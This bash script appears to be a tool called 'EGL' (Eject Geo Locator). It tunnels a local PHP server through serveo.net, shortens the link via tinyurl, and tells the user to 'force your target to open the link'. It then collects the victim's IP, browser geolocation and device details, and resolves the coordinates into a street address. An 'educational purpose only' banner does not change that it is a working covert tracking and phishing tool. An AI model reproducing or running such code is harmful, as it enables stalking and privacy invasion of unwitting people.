#!/bin/bash
my() {
echo -e      █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
echo -e      █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
echo -e      █░░║║║╠─║─║─║║║║║╠─░░█
echo -e      █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
echo -e      █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose your own Port or Hit Enter  (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
myaim

}

aim() {
clear
echo -e '\033[1;31m'"****************************************************************************\e[0m" 
echo -e '\033[1;32m'"*                                                                          *\e[0m"   
echo -e '\033[1;33m'"*              \e[0m"' \033[41m'"   ▄▄▄▄▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄▄▄▄▄    ▄  \e[0m" '\033[1;33m'"                      *\e[0m"    
echo -e '\033[1;34m'"*               \e[0m"'\033[41m'"  ▐░░░░░░░░░░░▌  ▐░░░░░░░░░░░▌  ▐░▌ \e[0m" '\033[1;34m'"                      *\e[0m"        
echo -e '\033[1;35m'"*               \e[0m"'\033[41m'"  ▐░█▀▀▀▀▀▀▀▀▀   ▐░█▀▀▀▀▀▀▀▀▀   ▐░▌ \e[0m" '\033[1;35m'"                      *\e[0m"         
echo -e '\033[1;36m'"*               \e[0m"'\033[42m'"  ▐░▌            ▐░▌            ▐░▌ \e[0m" '\033[1;36m'"                      *\e[0m"           
echo -e '\033[1;3m'"*               \e[0m"'\033[42m'"  ▐░█▄▄▄▄▄▄▄▄▄   ▐░▌ ▄▄▄▄▄▄▄▄   ▐░▌ \e[0m" '\033[1;37m'"                      *\e[0m"          
echo -e '\033[1;31m'"*               \e[0m"'\033[42m'"  ▐░░░░░░░░░░░▌  ▐░▌▐░░░░░░░░▌  ▐░▌ \e[0m" '\033[1;31m'"                      *\e[0m"           
echo -e '\033[1;32m'"*               \e[0m"'\033[42m'"  ▐░█▀▀▀▀▀▀▀▀▀   ▐░▌ ▀▀▀▀▀▀█░▌  ▐░▌ \e[0m" '\033[1;32m'"                      *\e[0m"          
echo -e '\033[1;33m'"*               \e[0m"'\033[42m'"  ▐░▌  EJECT     ▐░▌  GEO  ▐░▌  ▐░▌ LOCATOR \e[0m" '\033[1;33m'"              *\e[0m"           
echo -e '\033[1;34m'"*               \e[0m"'\033[43m'"  ▐░█▄▄▄▄▄▄▄▄▄   ▐░█▄▄▄▄▄▄▄█░▌  ▐░█▄▄▄▄▄▄▄▄▄ \e[0m"'\033[1;34m'"              *\e[0m"    
echo -e '\033[1;35m'"*               \e[0m"'\033[43m'"  ▐░░░░░░░░░░░▌  ▐░░░░░░░░░░░▌  ▐░░░░░░░░░░░▌\e[0m"'\033[1;35m'"              *\e[0m"    
echo -e '\033[1;36m'"*               \e[0m"'\033[43m'"   ▀▀▀▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀▀ \e[0m"'\033[1;36m'"              *\e[0m"    
echo -e '\033[1;37m'"*                  Eject            Geo            Locator\e[0m"'\033[2;31m'" \e[0m" '\033[1;37m'"               *\e[0m"
echo -e '\033[1;31m'"*               \e[0m˜”*°•.˜”*°•. M҉ ҉ ҉Y҉ ҉ ҉A҉ ҉ ҉I҉ ҉ ҉M҉ .•°*”˜.•°*”˜" '\e[0m" \033[2;31m'"  \e[0m" '\033[1;31m'"              *\e[0m"
echo -e '\033[1;32m'"*\e[1;33m       Script Coded By =>   \033[5;37m \033[41m ♥ Vᵢₖₐₛ  Cₕₐᵤdₕₐᵣy ♥ \e[0m"    '\033[1;32m'"                      *\e[0m"
echo -e '\033[1;33m'"*\e[1;33m       Published By =>        \033[5;37m \033[5;32m   www.gkaim.com \e[0m"  '\033[1;33m'"                         *\e[0m"
echo -e '\033[1;34m'"*\e[1;33m       Version =>                 \033[5;37m \033[44m  1.0  \e[0m"  '\033[1;34m'"                               *\e[0m"
echo -e '\033[1;35m'"*\033[1;32m ▁ ▂ ▄ ▅ ▆ ▇ █ EGL Is Only For Educational Purpose █ ▇ ▆ ▅ ▄ ▂ ▁\e[0m" '\033[1;35m'"         *\e[0m"
echo -e '\033[1;36m'"*       \033[1;35m \033[9;34m So please don't use it for any Illegal Purpose \e[0m" '\033[1;36m'"                 *\e[0m"
echo -e '\033[1;31m'"****************************************************************************\e[0m"    
echo
echo
}

is() {
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]SO ! Are you Agree to use EGL for Educational Purposes Only ? [y/N] >  \e[0m\en' ag
if  [[ $ag == Y || $ag == y ]]; then
the
elif [[ $ag == N || $ag == n ]]; then
exit
else
exit
fi
}

to() {

longitude=$(grep -o 'Longitude:.*' server/geolocate.txt | cut -d " " -f2 | tr -d ' ')
IFS=$'\n'
latitude=$(grep -o 'Latitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
altitude=$(grep -o 'Altitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
accuracy=$(grep -o 'Accuracy:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
hardware=$(grep -o 'Cores:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
speed=$(grep -o 'Speed:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
platform=$(grep -o 'Platform:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
heading=$(grep -o 'Heading:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
memory=$(grep -o 'Memory:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
useragent=$(grep -o 'User-Agent:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
height=$(grep -o 'Screen Height:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
width=$(grep -o 'Screen Width:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Geolocation:\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Latitude:\e[0m\e[1;77m %s\n\e[0m" $latitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Longitude:\e[0m\e[1;77m %s\n\e[0m" $longitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Altitude:\e[0m\e[1;77m %s\n\e[0m" $altitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Speed:\e[0m\e[1;77m %s\n\e[0m" $speed
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Heading:\e[0m\e[1;77m %s\n\e[0m" $heading
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Accuracy:\e[0m\e[1;77m %sm\n\e[0m" $accuracy
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Device Info:\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Platform:\e[0m\e[1;77m %s\n\e[0m" $platform
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Cores:\e[0m\e[1;77m %s\n\e[0m" $hardware
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $useragent
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Memory:\e[0m\e[1;77m %s\n\e[0m" $memory
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Screen Resolution:\e[0m\e[1;77m %sx%s\n\e[0m" $height $width
cat server/geolocate.txt >> server/saved.geolocate.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.geolocate.txt\e[0m\n" 
killall -2 php > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf "\n"
printf '\033[1;32m'"Do you want to see Real ADDRESS of your Target , if \033[1;37mYes \033[1;32mthen Press \e[0m \033[41m Y \e[0m\033[1;32m or can press any key to exit => \e[0m "
read geo
if [[ $geo == Y || $geo == y ]]; then
faltu 
else
printf "Also can Search that Longitude and Latitude in Google Map to find Address of your Target"
exit 1
fi
}
humanize() {
touch server/saved.geolocate.txt
ip=$(grep -a 'IP:' server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.ip.txt\e[0m\n"
cat server/ip.txt >> server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

vikas
}
the() {
printf "\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Type EGL to Access  \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == EGL || $option_server == egl ]]; then
my

else
echo -e '               \033[1;31m[!]Invalid Selection! \e[0m \033[47m\033[5;31m ACCESS DENIED \e[0m'
sleep 3
clear
the
fi
}
dehumanized() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] \033[4;31m Force your Target to open the Link....I'm Waiting...\e[0m\n"
while [ true ]; do


if [[ -e "server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] Congratulations!!!  IP Found!\n"
humanize

fi
sleep 1
done 

}
hrfp() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }



command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}
vikas() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Geolocation ...\e[0m\n"
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Geolocation Found!\n"
to

fi
sleep 0.5
if [[ -e "server/error.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Error on Geolocation!\n"
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User Denied Geolocation ...\e[0m\n"

rm -rf server/error.txt
vikas
elif [[ $checkerror == 2 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Geolocation Unavailable ...\e[0m\n"

rm -rf server/error.txt
vikas
elif [[ $checkerror == 3 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Time Out ...\e[0m\n"

rm -rf server/error.txt
vikas
elif [[ $checkerror == 4 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Unknown Error ...\e[0m\n"

rm -rf server/error.txt
vikas
else
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error reading file error.txt...\e[0m\n"
exit 1
fi
fi
sleep 0.5
done 
}

myaim() {
printf "\e[1;92m[\e[0m*\e[1;92m] Checking System Configuration ...\n"
php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 5
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Please wait,Starting Server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10 
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send this link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or send this tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
dehumanized
}

faltu() {
printf "\n"
printf "Wait Please Searching your Target Address "
sleep 3
printf "\n"
echo -e
printf "Your Target Address Is Near By"
printf "\n"
echo -e
for i in {17..100} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
wget -O- -q "http://maps.google.com/maps/api/geocode/xml?latlng=$latitude,$longitude&sensor=false"|grep formatted|head -n1|cut -d\> -f2|cut -d\< -f1
for i in {100..17} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
printf "\n"
echo -e
echo -e '\033[5;32m' "       Thanks for Using me , Keep Sharing\e[0m     "
exit 3
 } 
 trap 'printf "\n";just;exit 1' 2
just() {

checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
}

aim
hrfp
is




